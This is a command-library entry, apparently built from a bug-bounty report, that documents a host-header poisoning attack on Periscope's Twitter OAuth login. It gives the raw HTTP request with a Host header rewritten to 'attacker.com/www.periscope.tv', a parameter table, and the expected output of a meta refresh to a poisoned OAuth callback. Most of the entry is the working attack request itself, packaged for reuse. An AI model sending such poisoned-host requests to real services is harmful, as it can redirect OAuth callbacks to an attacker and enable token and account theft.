---
id: cmd-periscope-poisoned-host
data: |-
  GET /i/twitter/login?csrf=██████ HTTP/1.1
  Host: hackerone.com/www.periscope.tv
  User-Agent: █████████
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: https://www.periscope.tv/
  Cookie: ...
tags:
  - host-header-poisoning
  - oauth
type: command
output: HTML with meta refresh to poisoned OAuth URL
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.669Z'
verified: false
validated: true
submitted: true
---
# poisoned-host-header-request

## Command

```http
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
Cookie: ...
```

## Description

Modifies the Host header in the OAuth login request to poison the redirect domain, exploiting unvalidated header usage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| csrf | CSRF token | Yes |
| Host | Poisoned domain (attacker/original) | Yes |
| User-Agent | Browser string | Yes |

## Examples

### Basic Usage

```http
GET /i/twitter/login?csrf=def456 HTTP/1.1
Host: attacker.com/www.periscope.tv
...
```

## Expected Output

Response HTML containing meta refresh to Twitter OAuth with poisoned callback.

## Related

- [[commands/original-oauth-login-request]]
